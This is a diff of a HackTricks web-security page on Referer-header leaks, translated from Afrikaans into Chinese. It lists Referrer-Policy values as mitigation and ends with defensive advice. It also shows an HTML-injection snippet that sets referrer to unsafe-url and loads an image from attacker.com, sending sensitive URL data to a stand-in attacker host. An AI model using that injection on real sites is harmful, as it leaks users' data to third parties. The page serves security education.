@@ -1,29 +1,30 @@
 {% hint style="success" %}
-Leer en oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-# Verwysingskoppe en beleid
 
-Verwysers is die kop wat deur webblaaie gebruik word om aan te dui watter die vorige besoekte bladsy was.
+# 引用头和策略
 
-## Sensitiewe inligting uitgelek
+引用是浏览器用来指示上一个访问页面的头部。
 
-Indien op enige oomblik binne 'n webbladsy enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat 'n URL besoek wat deur die aanvaller beheer word. Dit kan die sensitiewe inligting binne die laaste GET-versoek uitlek.
+## 敏感信息泄露
 
-## Versagting
+如果在网页的某个地方，任何敏感信息位于 GET 请求参数中，如果页面包含指向外部源的链接，或者攻击者能够使/建议（社会工程）用户访问由攻击者控制的 URL。则可能能够提取最新 GET 请求中的敏感信息。
 
-Jy kan die blaaier laat 'n **Verwysingsbeleid** volg wat die sensitiewe inligting kan **verhoed** om na ander webtoepassings gestuur te word:
+## 缓解措施
+
+您可以让浏览器遵循一个 **Referrer-policy**，以 **避免** 将敏感信息发送到其他网络应用程序：
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -34,29 +35,13 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Teenmaatreël
+## 反制措施
 
-Jy kan hierdie reël oorskryf deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting uitbuit):
+您可以使用 HTML 元标签覆盖此规则（攻击者需要利用 HTML 注入）：
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
-## Verdediging
+## 防御
 
-Moenie enige sensitiewe data binne GET parameters of paaie in die URL plaas nie.
-
-
-{% hint style="success" %}
-Leer & oefen AWS Hack: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
-
-<details>
-
-<summary>Ondersteun HackTricks</summary>
-
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-{% endhint %}
+永远不要将任何敏感数据放入GET参数或URL路径中。
